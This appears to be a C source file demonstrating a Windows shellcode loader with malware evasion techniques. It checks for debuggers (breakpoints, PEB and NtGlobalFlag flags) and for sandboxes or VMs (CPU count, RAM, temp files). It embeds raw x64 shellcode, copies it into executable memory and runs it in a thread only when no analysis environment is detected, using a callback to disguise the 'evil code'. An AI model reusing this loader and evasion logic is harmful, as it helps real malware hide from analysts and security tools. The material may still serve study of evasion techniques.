
#include "AntiDebugger.h"
#include "AntiVMSandboxing.h"

// Change execution path.
// Resource: https://secrary.com/Random/HinderMalwareAnalyst/
BOOL CALLBACK EnumerateLoadedModulesProc64(
    _In_     PCTSTR  ModuleName,
    _In_     DWORD64 ModuleBase,
    _In_     ULONG   ModuleSize,
    _In_opt_ PVOID   UserContext
)
{
    // Evil code....
    MessageBoxA(NULL, "Bad code!", "Evil code cover up callback", MB_OK | MB_ICONWARNING);
    return FALSE;
}


BOOL antiDebugging() {
    BOOL isDebugging = FALSE; // To test all anti-debugging techniques.

    if (checkBreakpoints(0xcc, EnumerateLoadedModulesProc64)) {
        printf("Not executing payload!\nReason: Breakpoint (0xcc) in function EnumerateLoadedModulesProc64() found.\n\n");
        isDebugging = TRUE;
    }

    if (checkPEBDebugFlag()) {
        printf("Not executing payload!\nReason: PEB debug flag detected\n\n");
        isDebugging = TRUE;
    }

    if (checkNtGlobalFlag()) {
        printf("Not executing payload!\nReason: NtGlobalFlag contains NT_GLOBAL_FLAG_DEBUGGED value.\n\n");
        isDebugging = TRUE;
    }

    return isDebugging;
}

BOOL antiVM_Sandboxing() {

    BOOL isSandboxing = FALSE; // To test all anti-sandboxing techniques.

    if (checkCPULimited()) {
        printf("Not executing payload!\nDetected less than 2 processors.\n\n");   
        isSandboxing = TRUE;
    }

    if (checkRAMLimited()) {
        printf("Not executing payload!\nDetected less than 2 Gb of RAM memory.\n\n");
        isSandboxing = TRUE;
    }

    if (checkTempFiles()) {
        printf("Not executing payload!\nDetected less than 3 temporary files.\n\n");
        isSandboxing = TRUE;
    }

    return isSandboxing;
}

BOOL antiReversing() {
    BOOL isReversing = FALSE; // To test all anti-reversing techniques.
    return isReversing;
}


 unsigned char payload[] =
    "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";

int main(int argc, char* argv[]) 
{
    // Sleep(60000);
    
    void* payloadMem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlCopyMemory(payloadMem, payload, sizeof(payload));

    DWORD oldProtect;
    VirtualProtect(payloadMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);

    // Already running this anti-debugging technique.
    checkFunctionHash(&EnumerateLoadedModulesProc64);

    printf("Payload loaded, hit to continue...\n");
    getchar();

    /**
     * @brief All new anti debug/reversing/sandbox checks.
     */
    if (antiReversing() || antiVM_Sandboxing() || antiDebugging()) {
        return 1;
    }

    // Cover up executing evil code.
    EnumerateLoadedModules64(
        GetCurrentProcess(), 
        (PENUMLOADED_MODULES_CALLBACK64)EnumerateLoadedModulesProc64, 
        NULL);

    HANDLE thread;
    if (!(thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloadMem, NULL, NULL, NULL))) {
        printf("Failed to execute payload...\n");
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);

    return 0;
}